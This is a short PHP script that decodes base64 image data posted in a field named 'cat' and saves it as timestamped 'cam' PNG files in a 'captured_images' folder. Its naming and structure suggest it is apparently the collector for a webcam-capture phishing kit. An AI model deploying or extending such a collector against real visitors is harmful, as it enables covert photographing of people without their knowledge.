<?php

$date = date('dMYHis');
$imageData = $_POST['cat'];

// Create directory if it doesn't exist
$imageDir = 'captured_images';
if (!is_dir($imageDir)) {
    mkdir($imageDir, 0755, true);
}

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
}

$filteredData = substr($imageData, strpos($imageData, ",")+1);
$unencodedData = base64_decode($filteredData);

// Use full path for saving the image
$imagePath = $imageDir . '/cam' . $date . '.png';
$fp = fopen($imagePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

exit();
?>
